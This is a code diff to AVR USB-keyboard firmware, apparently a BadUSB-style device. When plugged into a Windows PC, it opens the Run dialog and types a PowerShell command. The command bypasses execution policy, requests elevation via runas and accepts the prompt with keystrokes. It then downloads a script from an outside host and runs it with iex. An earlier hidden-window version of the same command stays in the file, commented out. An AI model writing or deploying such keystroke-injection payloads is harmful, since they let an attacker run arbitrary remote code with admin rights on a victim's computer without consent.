@@ -33,12 +33,12 @@
 #define LED_ON		(PORTD &= ~(1<<6))
 #define LED_OFF		(PORTD |= (1<<6))
 #define CPU_PRESCALE(n)	(CLKPR = 0x80, CLKPR = (n))
-
-const int textLength = 179;
-uint8_t keysToPress[358];
-
-char textToType[] = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -Command \"iex ((new-object net.webclient).DownloadString('http://mironiasty.net/examples/pspayload/hello.ps1'))\"";
-
+// 
+// const int textLength = 179;
+// uint8_t keysToPress[358];
+// 
+// char textToType[] = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -Command \"iex ((new-object net.webclient).DownloadString('http://mironiasty.net/examples/pspayload/hello.ps1'))\"";
+// 
 
 
 int main(void)
@@ -63,25 +63,22 @@ int main(void)
 	// Wait an extra seconds for the PC's operating system to load drivers
 	// and do whatever it does to actually be ready for input
 	_delay_ms(2000);
+	
 	usb_keyboard_press(KEY_R, KEY_GUI);
 	_delay_ms(500);
 	
-	char powershell[] = "powershell\n";
-	uint8_t powershell_keys[22];
-	convertStrningToKeys(powershell, powershell_keys, 11);
-	writeKeys(powershell_keys, 11); 
+
+	tepeText("powershell\n");
 	
 	_delay_ms(500);
-	char command[] = "Start-Process powershell -Verb runas -ArgumentList '-ExecutionPolicy Bypass','-Command \"iex ((new-object net.webclient).DownloadString(''http://mironiasty.net/examples/pspayload/hello.ps1''))\"'\n";
- 	uint8_t command_keys[390];
-	convertStrningToKeys(command, command_keys, 195);
-	writeKeys(command_keys, 195); 
+	
+	tepeText("Start-Process powershell -Verb runas -ArgumentList '-ExecutionPolicy Bypass','-Command \"iex ((new-object net.webclient).DownloadString(''http://mironiasty.net/examples/pspayload/hello.ps1''))\"'\n");
 	
 	_delay_ms(300);
 	
 	usb_keyboard_press(KEY_TAB, KEY_SHIFT);
 	_delay_ms(100);
 	usb_keyboard_press(KEY_ENTER, 0);
-	
+
 	
 }
